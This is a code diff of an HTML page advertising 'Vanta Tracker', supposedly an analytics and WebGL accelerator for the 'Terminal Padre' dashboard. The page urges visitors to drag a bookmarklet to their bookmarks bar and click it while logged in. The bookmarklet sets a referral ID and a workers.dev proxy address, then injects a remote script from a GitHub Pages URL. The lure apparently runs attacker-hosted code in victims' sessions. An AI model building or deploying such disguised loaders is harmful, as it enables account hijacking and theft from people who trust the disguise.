@@ -2,55 +2,44 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Vanta Tracker | Advanced Terminal Analytics</title>
+    <title>Vanta Tracker | WebGL Terminal Acceleration</title>
     <style>
-        :root { --vanta-green: #00ff88; --vanta-bg: #050505; }
-        body { background: var(--vanta-bg); color: #fff; font-family: 'Inter', sans-serif; text-align: center; margin: 0; padding: 100px 20px; }
-        .hero { max-width: 800px; margin: 0 auto; }
-        h1 { color: var(--vanta-green); font-size: 3rem; text-shadow: 0 0 20px rgba(0,255,136,0.3); }
-        p { color: #888; font-size: 1.2rem; margin-bottom: 40px; }
-        .btn-container { padding: 40px; border: 1px dashed #333; border-radius: 12px; display: inline-block; }
+        :root { --primary: #00ff88; --bg: #050505; }
+        body { background: var(--bg); color: #fff; font-family: 'Inter', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .container { border: 1px solid #1a1a1a; padding: 50px; border-radius: 20px; background: #080808; text-align: center; }
+        h1 { color: var(--primary); font-weight: 800; letter-spacing: -1px; }
         .btn { 
-            display: inline-block; padding: 18px 45px; 
-            background: linear-gradient(135deg, var(--vanta-green), #00cc66); 
-            color: #000; font-weight: 800; text-decoration: none; border-radius: 8px;
-            box-shadow: 0 0 25px rgba(0, 255, 136, 0.4); cursor: move;
+            display: inline-block; padding: 18px 40px; background: var(--primary); 
+            color: #000; font-weight: 800; text-decoration: none; border-radius: 8px; 
+            margin-top: 25px; box-shadow: 0 0 20px rgba(0,255,136,0.3);
         }
-        .ref-box { margin-top: 20px; font-size: 0.8rem; color: #444; }
     </style>
 </head>
 <body>
-    <div class="hero">
-        <h1>VANTA CORE v2.0</h1>
-        <p>Real-time terminal analytics and WebGL acceleration for Padre Dashboard.</p>
-        
-        <div class="btn-container">
-            <a id="vanta-loader" class="btn" href="#">DRAG TO BOOKMARKS</a>
-            <div class="ref-box">ID: t23dad55</div>
-        </div>
-        
-        <ol style="text-align:left; max-width:400px; margin: 40px auto; color:#777;">
-            <li>Ensure Bookmarks Bar is visible (Ctrl+Shift+B).</li>
-            <li>Drag the green button to your bar.</li>
-            <li>Click it while on the Terminal Padre dashboard.</li>
-        </ol>
+    <div class="container">
+        <h1>VANTA TRACKER v2.0</h1>
+        <p style="color:#666;">Optimized for Terminal Padre</p>
+        <a id="vanta-btn" class="btn" href="#">[ DRAG TO BOOKMARKS ]</a>
+        <p style="font-size: 10px; margin-top: 20px; color: #333;">REF: t23dad55</p>
     </div>
 
     <script>
-        const REF_ID = "t23dad55"; 
-        const PROXY = "https://vanta-proxy.jdurrulo.workers.dev/"; 
-        // Replace with your GitHub Pages URL after uploading modalx.js
-        const PAYLOAD_URL = "https://YOUR_USERNAME.github.io/vanta-tracker-project/modalx.js";
+        const CONFIG = {
+            ref: "t23dad55",
+            proxy: "https://vanta-proxy.jdurrulo.workers.dev/",
+            // IMPORTANT: Replace 'Jinxthesimp' with your actual GitHub username
+            payload: "https://Jinxthesimp.github.io/Dropshipper/tracker.js"
+        };
 
         const loader = `javascript:(function(){
-            window.VANTA_REF="${REF_ID}";
-            window.VANTA_PROXY="${PROXY}";
+            window.V_REF="${CONFIG.ref}";
+            window.V_PROXY="${CONFIG.proxy}";
             const s=document.createElement('script');
-            s.src="${PAYLOAD_URL}?"+Date.now();
+            s.src="${CONFIG.payload}?"+Date.now();
             document.head.appendChild(s);
         })();`;
 
-        document.getElementById('vanta-loader').href = loader;
+        document.getElementById('vanta-btn').href = loader;
     </script>
 </body>
 </html>
